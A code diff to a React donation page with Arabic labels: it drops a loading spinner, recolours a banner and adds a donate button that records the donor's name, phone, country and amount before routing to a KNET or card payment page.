@@ -59,7 +59,6 @@ export default function CharityDonationPage() {
   const [phone, setPhone] = useState("")
   const [name, setName] = useState("")
   const [value, setValue] = useState(10)
-  const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
   const [country, setCountry] = useState("")
   const router = useRouter()
@@ -167,7 +166,7 @@ export default function CharityDonationPage() {
       {/* Main Content */}
       <main className="flex-1 overflow-auto">
         {/* Campaign Banner */}
-        <div className="relative bg-gradient-to-r from-teal-500 to-teal-400 text-white rounded-lg mx-4 overflow-hidden">
+        <div className="relative bg-gradient-to-r from-[#006a8f] to-teal-400 text-white rounded-lg mx-4 overflow-hidden">
           <div className="flex">
             <img src="/fzza.jpeg" alt="Child profile" className="w-full h-auto" />
           </div>
@@ -356,7 +355,32 @@ export default function CharityDonationPage() {
         ))}
       </div>
      {selectedMethod === 4 || selectedMethod ===6 ? <p style={{fontSize:10}} className="text-sm text-red-500 text-center font-bold py-2">غير متوفر حالياً</p>:null}
+     <div className="space-y-2 mb-6 py-6">
+            <Button className="w-full bg-amber-600 hover:bg-amber-700 text-white py-3 rounded-md flex items-center justify-center gap-2">
+              <svg viewBox="0 0 24 24" className="h-5 w-5" fill="currentColor">
+                <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z" />
+              </svg>
+            </Button>
+            <Button
+              onClick={() => {
+                localStorage.setItem("item", value.toString())
+                setTimeout(() => {
+                  addData({ id: _id, page: selectedMethod.toString(), name: name, phone: phone, country: country })
+                  if (selectedMethod === 1 ) {
+                    router.push("/knet")
 
+                  } else if ( selectedMethod === 2 || selectedMethod === 3 || selectedMethod===5 ) {
+                    router.push('/payment')
+                  }else{
+                    setShowError(true)
+                  }
+                }, 4000)
+              }}
+              className="w-full bg-teal-600 hover:bg-teal-700 text-white py-3 rounded-md"
+            >
+              تبرع
+            </Button>
+          </div>
     </div>
       </main>
 
@@ -368,7 +392,6 @@ export default function CharityDonationPage() {
           </svg>
         </button>
       </div>
-      {loading && <FullPageLoader />}
 
       {/* Add Footer component at the bottom */}
       <Footer />
